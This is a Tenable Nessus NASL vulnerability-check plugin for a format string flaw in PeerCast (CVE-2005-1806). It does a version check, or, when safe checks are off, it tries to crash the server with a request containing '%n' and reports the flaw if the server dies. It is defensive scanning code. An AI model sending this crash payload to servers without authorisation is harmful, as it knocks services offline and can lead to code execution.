#
# (C) Tenable Network Security
#


if (description) {
  script_id(18417);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-1806");
  script_bugtraq_id(13808);

  name["english"] = "PeerCast Format String Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote peer-to-peer application is affected by a format string
vulnerability. 

Description :

The remote host is running PeerCast, a peer-to-peer software package
that lets users broadcast streaming media. 

The version installed on the remote host suffers from a format string
vulnerability.  An attacker can issue requests containing format
specifiers that will crash the server and potentially permit arbitrary
code execution subject to privileges of the user under which the
affected application runs. 

See also : 

http://www.gulftech.org/?node=research&article_id=00077-05282005
http://archives.neohapsis.com/archives/bugtraq/2005-05/0335.html
http://www.peercast.org/forum/viewtopic.php?p=11596

Solution : 

Upgrade to PeerCast 0.1212 or newer.

Risk factor : 

Critical / CVSS Base Score : 10
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for format string vulnerability in PeerCast";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 7144);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:7144);
if (!get_port_state(port)) exit(0);


# Identify the version of PeerCast if it's installed.
#
# nb: at least as of 0.1212, PeerCast doesn't provide a server response
#     header if the initial page is requested so we can't use
#     get_http_banner() to identify it.
req = http_get(item:"/html/en/index.htm", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if (res == NULL) exit(1);

foreach line (split(res, keep:FALSE)) {
  if (line =~ "^Server: PeerCast/") {
    ver = ereg_replace(string:line, pattern:".*PeerCast/([0-9.]+).*", replace:"\1");
    break;
  }
  if (!strlen(line)) break;
}
if (isnull(ver)) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  # Look at the version number.
  if (ver =~ "^[0-9]+\.[0-9]") {
    iver = split(ver, sep:'.', keep:FALSE);
    # There's a problem if it's earlier than 0.1212.
    if (int(iver[0]) == 0 && int(iver[1]) < 1212) {
      security_hole(port);
      exit(0);
    }
  }
}
# Otherwise...
else {
  # Make sure the server's up.
  soc = http_open_socket(port);
  if (!soc || http_is_dead(port:port)) exit(1);

  # Now try to crash the server.
  req = http_get(item:"/html/en/index.htm%n", port:port);
  send(socket:soc, data:req);
  http_recv(socket:soc);
  http_close_socket(soc);

  sleep(1);

  # There's a problem if the server's down.
  if (http_is_dead(port:port)) {
    security_hole(port);
    exit(0);
  }
}
